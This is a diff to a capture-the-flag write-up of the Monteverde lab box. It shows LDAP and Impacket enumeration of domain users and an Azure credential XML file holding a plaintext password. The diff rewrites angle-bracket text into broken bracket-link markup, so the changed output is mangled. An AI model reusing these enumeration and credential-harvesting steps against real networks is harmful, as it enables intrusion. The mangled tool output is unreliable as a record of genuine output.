@@ -100,7 +100,7 @@ root@w0lf:~# ldapsearch -h 10.10.10.172 -x -b "DC=MEGABANK,DC=LOCAL" '(objectcla
 # extended LDIF
 #
 # LDAPv3
-# base <DC=MEGABANK,DC=LOCAL> with scope subtree
+# base [DC=MEGABANK,DC=LOCAL](DC=MEGABANK,DC=LOCAL) with scope subtree
 # filter: (objectclass=User)
 # requesting: sAMAccountName 
 #
@@ -194,16 +194,16 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 [*] Querying 10.10.10.172 for information about domain.
 Name                  Email                           PasswordLastSet      LastLogon           
 --------------------  ------------------------------  -------------------  -------------------
-Guest                                                 <never>              <never>             
+Guest                                                 [never](never)              [never](never)             
 AAD_987d7f2f57d2                                      2020-01-03 04:23:24.984897  2020-05-29 07:47:15.269032 
 mhope                                                 2020-01-03 05:10:05.908924  2020-01-03 18:59:59.037500 
 SABatchJobs                                           2020-01-03 18:18:46.392235  2020-01-06 15:57:18.925036 
-svc-ata                                               2020-01-03 18:28:31.332169  <never>             
-svc-bexec                                             2020-01-03 18:29:55.863422  <never>             
-svc-netapp                                            2020-01-03 18:31:42.786264  <never>             
-dgalanos                                              2020-01-03 18:36:10.519660  <never>             
-roleary                                               2020-01-03 18:38:05.832167  <never>             
-smorgan                                               2020-01-03 18:39:21.629084  <never>
+svc-ata                                               2020-01-03 18:28:31.332169  [never](never)             
+svc-bexec                                             2020-01-03 18:29:55.863422  [never](never)             
+svc-netapp                                            2020-01-03 18:31:42.786264  [never](never)             
+dgalanos                                              2020-01-03 18:36:10.519660  [never](never)             
+roleary                                               2020-01-03 18:38:05.832167  [never](never)             
+smorgan                                               2020-01-03 18:39:21.629084  [never](never)
 ```
 
 So its pretty same we got.
@@ -296,20 +296,20 @@ I found a `azure.xml` file in `mhope` directory downloaded to my machine.
 
 ```bash
 root@w0lf:~/CTF/HTB/Boxes/Monteverde# cat azure.xml 
-��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
-  <Obj RefId="0">
-    <TN RefId="0">
-      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
-      <T>System.Object</T>
-    </TN>
-    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
-    <Props>
-      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
-      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
-      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
-      <S N="Password">4n0therD4y@n0th3r$</S>
-    </Props>
-  </Obj>
+��[Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"](Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04")
+  [Obj RefId="0"](Obj RefId="0")
+    [TN RefId="0"](TN RefId="0")
+      [T](T)Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential[/T](/T)
+      [T](T)System.Object[/T](/T)
+    [/TN](/TN)
+    [ToString](ToString)Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential[/ToString](/ToString)
+    [Props](Props)
+      [DT N="StartDate"](DT N="StartDate")2020-01-03T05:35:00.7562298-08:00[/DT](/DT)
+      [DT N="EndDate"](DT N="EndDate")2054-01-03T05:35:00.7562298-08:00[/DT](/DT)
+      [G N="KeyId"](G N="KeyId")00000000-0000-0000-0000-000000000000[/G](/G)
+      [S N="Password"](S N="Password")4n0therD4y@n0th3r$[/S](/S)
+    [/Props](/Props)
+  [/Obj](/Obj)
 ```
 
 It reveals a password for us. It can be user `mhope` password. We know port `5985` open so I tried `evil-winrm`
